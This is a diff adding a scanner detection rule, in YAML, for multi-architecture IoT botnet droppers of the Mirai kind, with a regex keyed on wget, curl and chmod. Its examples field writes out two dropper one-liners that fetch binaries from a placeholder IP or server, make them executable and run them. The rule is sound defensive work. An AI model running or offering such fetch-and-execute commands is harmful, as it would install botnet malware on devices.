@@ -1,0 +1,38 @@
+# Bash Pattern: Multi-Architecture Malware Dropper
+# Detects IoT botnet droppers that download binaries for multiple CPU architectures
+
+id: BASH-020
+name: Multi-Architecture Malware Dropper
+description: |
+  Detects scripts that download and execute binaries for multiple CPU architectures,
+  commonly used by IoT botnets like Mirai. These scripts typically iterate through
+  architecture names (mips, arm, x86, etc.) and download/execute matching binaries.
+languages:
+  - bash
+detection_type: regex
+detection_logic: '(?i)(?:mips|mpsl|arm|arm[4567]|sh4|ppc|x86|arc|sparc|m68k|aarch64|i[3-6]86|powerpc).*?(?:\bwget\b|\bcurl\b).*?(?:\bchmod\b\s+(?:777|\+x)).*?\./'
+severity: Critical
+mitre_technique: T1105
+confidence: 0.95
+category: malware-dropper
+enabled: true
+paranoia_levels:
+  - 1
+  - 2
+  - 3
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-25"
+  updated: "2025-11-25"
+  references:
+    - "https://attack.mitre.org/techniques/T1105/"
+    - "https://www.cloudflare.com/learning/ddos/glossary/mirai-botnet/"
+  tags:
+    - bash
+    - iot-botnet
+    - multi-architecture
+    - mirai
+    - malware-dropper
+  examples:
+    - 'for arch in mips arm x86; do wget http://1.2.3.4/$arch; chmod 777 $arch; ./$arch; done'
+    - 'binarys="mips mpsl arm"; wget http://server/$binname.$arch; chmod 777 $execname'
